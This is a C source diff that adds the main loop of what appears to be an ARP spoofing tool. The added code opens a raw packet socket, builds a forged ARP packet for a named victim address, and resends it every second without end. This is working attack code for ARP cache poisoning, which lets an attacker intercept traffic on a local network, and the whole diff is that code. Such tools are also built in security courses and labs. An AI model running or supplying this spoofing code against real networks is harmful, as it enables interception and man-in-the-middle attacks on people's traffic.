@@ -24,7 +24,24 @@ unsigned char *process_arp_spoofing(char *packet,
     return retrieve_mac_addr_from_frame(buffer);
 }
 
-void spoofing_loop(char *victim_addr)
+void spoofing_loop(params_t *params, char *victim_addr, arp_hdr_t *arp_hdr)
 {
+    int spoofing_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
+    struct sockaddr_ll *spoofed_addr = create_spoofed_arp_socketaddr(params, victim_addr);
+    char *packet = create_spoofed_packet(arp_hdr, spoofed_addr, params, victim_addr);
+    ssize_t status = 0;
 
+    while (true) {
+        status = sendto(spoofing_socket, packet, PACKET_LEN, 0,
+            (struct sockaddr *) spoofed_addr, sizeof(*spoofed_addr));
+        if (status < 0) {
+            perror("Spoofed packet: ");
+            break;
+        }
+        printf("Spoofed packet sent to ‘%s'\n", params->dest_ip);
+        sleep(1);
+    }
+    free(packet);
+    free(spoofed_addr);
+    close(spoofing_socket);
 }
